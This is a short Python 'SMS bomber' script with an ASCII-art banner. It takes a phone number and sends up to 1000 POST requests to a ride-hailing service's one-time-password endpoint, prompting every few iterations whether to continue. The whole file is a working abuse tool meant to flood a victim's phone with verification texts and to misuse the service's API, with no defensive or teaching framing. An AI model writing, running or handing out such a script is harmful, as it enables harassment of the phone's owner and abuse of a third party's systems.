import requests
import os
from colorama import Fore


os.system("clear")
print(Fore.RED + """
  ██████     ███▄ ▄███▓     ██████ 
▒██    ▒    ▓██▒▀█▀ ██▒   ▒██    ▒ 
░ ▓██▄      ▓██    ▓██░   ░ ▓██▄   
  ▒   ██▒   ▒██    ▒██      ▒   ██▒
▒██████▒▒   ▒██▒   ░██▒   ▒██████▒▒
▒ ▒▓▒ ▒ ░   ░ ▒░   ░  ░   ▒ ▒▓▒ ▒ ░
░ ░▒  ░ ░   ░  ░      ░   ░ ░▒  ░ ░
░  ░  ░     ░      ░      ░  ░  ░  
      ░            ░            ░  
""")

url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
number = int(input(Fore.CYAN + "Enter your number : "))
for i in range(0, 1000):
    if i % 5 == 0 and i > 0:
        x = input("Do you want to continue? {y/n} : ")
        if x == 'n':
            break
        else:
            continue
    requests.post(url, data={"cellphone": number})
    print(Fore.RED + "INFO:" + Fore.LIGHTBLACK_EX + "[Sending]")